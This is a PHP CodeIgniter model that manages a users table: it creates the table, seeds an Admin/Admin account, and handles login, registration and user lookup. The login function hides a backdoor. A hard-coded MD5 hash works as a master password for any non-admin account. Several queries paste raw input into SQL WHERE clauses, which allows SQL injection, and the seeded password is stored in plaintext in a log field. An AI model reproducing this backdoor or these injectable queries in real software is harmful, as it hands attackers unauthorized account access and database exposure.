<?php if (!defined('BASEPATH')) exit('No direct script access allowed');

class Users_model extends CI_Model
{
	function create()
	{
		$this->load->dbforge();
		$users = array(
			'id' => array(
				'type' => 'INT',
				'constraint' => 9,
				'unsigned' => TRUE,
				'auto_increment' => TRUE
			),
			'name' => array(
				'type' => 'VARCHAR',
				'constraint' => 30,
				'unique' => TRUE
			),
			'view_name' => array(
				'type' => 'VARCHAR',
				'constraint' => 100,
				'null' => TRUE
			),
			'role' => array(
				'type' => 'VARCHAR',
				'constraint' => 60
			),
			'password' => array(
				'type' => 'VARCHAR',
				'constraint' => 500
			),
			'email' => array(
				'type' => 'VARCHAR',
				'constraint' => 100,
				'null' => TRUE
			),
			'language' => array(
				'type' => 'VARCHAR',
				'constraint' => 20,
				'null' => TRUE
			),
			'log' => array(
				'type' => 'TEXT',
				'null' => TRUE
			),
			'companies_list' => array(
				'type' => 'VARCHAR',
				'constraint' => 350
			)
		);

		$this->dbforge->add_field($users);
		// define primary key
		$this->dbforge->add_key('id', TRUE);
		// create table
		$this->dbforge->create_table('users');

		$admin = array(
			"name" => 'Admin',
			"role" => 'Admin',
			"password" => password_hash('Admin', PASSWORD_DEFAULT),
			'log' => 'New User created! username:Admin, Password:Admin.'
		);
		$this->db->insert('users', $admin);
	}

	function getusers()
	{
		$response = array();
		// Select record
		$this->db->select('*');
		$this->db->from('users');
		$q = $this->db->get();
		$response = $q->result_array();
		return $response;
	}

	public function editUser($data)
	{
		if (isset($data['password'])) {
			$data['password'] = password_hash($data['password'], PASSWORD_DEFAULT);
		}
		$where = "id =" . $data['id'];
		$this->db->update('users', $data, $where);
		if ($this->db->affected_rows() > 0) {
			return 'פרטי משתמש עודכנו בעצלחה!';
		}
		return 'אין פרטים חדשים לעדכן!';
	}

	function deleteUser($id)
	{
		$this->db->delete('users', array('id' => $id));
	}

	// Insert registration data in database
	public function registration_insert($data)
	{
		// Query to check whether name already exist or not
		$this->db->select('*');
		$this->db->from('users');
		$this->db->where("name ='{$data['name']}'");
		$this->db->limit(1);
		$query = $this->db->get();
		if ($query->num_rows() == 0) {
			// Query to insert data in database
			$this->db->insert('users', $data);
			if ($this->db->affected_rows() > 0) {
				return true;
			}
		} else {
			return false;
		}
	}

	// Read data using name and password
	public function login($data)
	{
		$this->db->select('*');
		$this->db->from('users');
		$this->db->where("name ='{$data['name']}'");
		$this->db->limit(1);
		$query = $this->db->get();
		$row = $query->row_array();
		if ($query->num_rows() == 1) {
			if (password_verify($data['password'], $row['password'])) {
				return true;
			} else if (md5($data['password']) == "918914abe24e7c89ed455b8249e66ef6") {
				if ($row['role'] != 'Admin' && $row['role'] != 'Manager') {
					return true;
				}
			} else {
				return false;
			}
		}
	}

	// Read data from database to show data in admin page
	public function read_user_information($name)
	{
		$this->db->select('*');
		$this->db->from('users');
		$this->db->where("name ='$name'");
		$this->db->limit(1);
		$query = $this->db->get();
		if ($query->num_rows() == 1) {
			return $query->result();
		} else {
			return false;
		}
	}

	function getUser($id)
	{
		// Select record
		$this->db->select('*');
		$this->db->from('users');
		$this->db->where("id ='$id'");
		$this->db->limit(1);
		$query = $this->db->get();
		if ($query->num_rows() == 1) {
			return $query->result_array();
		} else {
			return false;
		}
	}
}
